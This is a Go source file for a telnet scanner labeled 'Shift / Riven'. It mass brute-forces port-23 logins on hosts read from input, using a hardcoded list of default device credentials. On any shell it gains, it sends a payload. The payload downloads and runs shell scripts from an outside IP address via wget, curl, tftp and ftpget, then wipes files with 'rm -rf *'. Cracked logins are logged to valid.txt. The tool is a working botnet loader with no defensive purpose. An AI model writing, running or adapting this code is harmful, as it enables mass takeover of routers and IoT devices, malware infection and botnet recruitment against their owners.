package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
}

const (
	TELNET_TIMEOUT  = 2 * time.Second
	MAX_WORKERS     = 2000
	PAYLOAD         = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.15.124.203/ohshit.sh; curl -O http://157.15.124.203/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 157.15.124.203 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 157.15.124.203; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 157.15.124.203 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *"
	STATS_INTERVAL  = 1 * time.Second
	MAX_QUEUE_SIZE  = 100000
	CONNECT_TIMEOUT = 1 * time.Second
)

type CredentialResult struct {
	Host     string
	Username string
	Password string
	Output   string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())

	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}

	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}

		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}

	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}

		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}

	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)

		if promptCheck(data, shellPrompts...) {
			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
			_, err = conn.Write([]byte(PAYLOAD + "\n"))
			if err != nil {
				return false, "write command failed"
			}
			output := s.readCommandOutput(conn)
			return true, CredentialResult{
				Host:     host,
				Username: username,
				Password: password,
				Output:   output,
			}
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := TELNET_TIMEOUT / 2

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			if bytes.Contains(data, []byte(PAYLOAD)) {
				break
			}
			continue
		}
		data = append(data, buf[:n]...)
		if bytes.Contains(data, []byte(PAYLOAD)) {
			break
		}
	}

	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)

		found := false
		if host == "" {
			continue
		}

		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)

				credResult := result.(CredentialResult)
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()

				fmt.Printf("\n[+] Found: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
				fmt.Printf("[*] Output: %s\n\n", credResult.Output)

				// Simpan ke valid.txt
				f, err := os.OpenFile("valid.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err == nil {
					_, _ = f.WriteString(fmt.Sprintf("%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password))
					f.Close()
				} else {
					fmt.Printf("[!] Gagal menulis ke valid.txt: %v\n", err)
				}

				found = true
				break
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)

			memStats := runtime.MemStats{}
			runtime.ReadMemStats(&memStats)

			fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | queue: %d | routines: %d\n",
				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	fmt.Printf("Initializing scanner (%d / %d)...\n\n\n", MAX_WORKERS, MAX_QUEUE_SIZE)

	go s.statsThread()

	stdinDone := make(chan bool)

	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0

		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}

			host := line[:len(line)-1]
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++

				select {
				case s.hostQueue <- host:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- host
				}
			}
		}

		fmt.Printf("Finished reading input: %d hosts queued\n", hostCount)
		stdinDone <- true
	}()

	maxWorkers := MAX_WORKERS
	for i := 0; i < maxWorkers; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone

	close(s.hostQueue)

	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	invalid := atomic.LoadInt64(&s.invalid)

	fmt.Println("\n\nScan complete!")
	fmt.Printf("Total scanned: %d\n", scanned)
	fmt.Printf("Valid logins found: %d\n", valid)
	fmt.Printf("Invalid attempts: %d\n", invalid)

	if len(s.foundCredentials) > 0 {
		fmt.Println("\nFound credentials:")
		for _, cred := range s.foundCredentials {
			fmt.Printf("%s:23 %s:%s\n", cred.Host, cred.Username, cred.Password)
		}
	}
}

func main() {
	fmt.Println("\n\n\nShift / Riven Telnet scanner")
	fmt.Printf("Total CPU cores: %d\n", runtime.NumCPU())

	scanner := NewTelnetScanner()
	scanner.Run()
}
